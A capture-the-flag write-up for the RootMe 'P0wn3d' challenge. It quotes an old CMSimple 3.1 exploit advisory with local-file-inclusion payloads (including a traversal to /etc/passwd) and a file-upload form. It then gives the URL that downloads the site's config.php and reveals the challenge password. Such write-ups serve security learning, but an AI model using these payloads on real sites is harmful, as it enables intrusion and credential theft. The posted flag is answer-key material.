---
title: RootMe - P0wn3d Writeup
date: 2023-10-10
categories: [RootMe, Realistic]
tags: [RootMe, RootMe - Realistic, WriteUp, LFI, Local File Inclusion, PHP]
author: barabulkit
---

# RootMe - P0wn3d

In this challenge we have source code attached to it, and we also have a hint about lfi cause its stated in related resources

So with just googling `cmsimple lfi` we can already find exploit

```html
<pre>
#
# CMSimple 3.1 Local File Inclusion / Arbitrary File Upload
# download: http://www.cmsimple.org/?Downloads
# dork: "Powered by CMSimple"
#
# author: irk4z@yahoo.pl
# homepage: http://irk4z.wordpress.com
#


Local File Inclusion :

	http://[host]/[path]/index.php?sl=[file]%00
	http://[host]/[path]/index.php?sl=../../../../../../../etc/passwd%00


Arbitrary File Upload (into http://[host]/[path]/downloads/ ):
</pre>
<form method="POST" enctype="multipart/form-data" action="http://[host]/[path]/index.php?sl=../adm&adm=1" >
<input type="file" class="file" name="downloads" size="30">
<input type="hidden" name="action" value="upload">
<input type="hidden" name="function" value="downloads">
<input type="submit" class="submit" value="Upload">
</form>

# milw0rm.com [2008-05-31]
```

by exploring source code we can find that password is stored in `config.php`

```php
<?php
$cf['security']['password']="test";
$cf['security']['type']="page";
$cf['site']['title']="The name of the site";
$cf['site']['template']="default";
$cf['language']['default']="en";
$cf['meta']['keywords']="CMSimple, Content Management System, php";
$cf['meta']['description']="CMSimple is a simple content management system for smart maintainance of small commercial or private sites. It is simple - small - smart! It is Free Software licensed under AGPL";
$cf['backup']['numberoffiles']="5";
$cf['images']['maxsize']="150000";
$cf['downloads']['maxsize']="1000000";
$cf['mailform']['email']="";
$cf['editor']['height']="(screen.availHeight)-400";
$cf['editor']['external']="";
$cf['menu']['color']="000000";
$cf['menu']['highlightcolor']="808080";
$cf['menu']['levels']="3";
$cf['menu']['levelcatch']="10";
$cf['menu']['sdoc']="";
$cf['uri']['seperator']=":";
$cf['uri']['length']="200";
$cf['xhtml']['endtags']="";
$cf['xhtml']['amp']="true";
$cf['plugins']['folder']="";
$cf['functions']['file']="functions.php";
$cf['scripting']['regexp']="\#CMSimple (.*?)\#";
?>
```

And that we can download it (below is source code from adm.php)
```php
if ($f == 'file') {
		if (preg_match("/\d{3}\.htm/", $file))$pth['file'][$file] = $pth['folder']['content'].'/'.$file;
		if ($pth['file'][$file] != '') {
			if ($action == 'view') {
				header('Content-Type: text/plain');
				echo rmnl(rf($pth['file'][$file]));
				exit;
			}
			if ($action == 'download') {
				download($pth['file'][$file]);
            } 
```

so after goint to url
```
http://challenge01.root-me.org/realiste/ch6/index.php?sl=../adm&adm=1&file=config&action=download
```

we get this file and password `CtP6p$>@8xm-0t` in it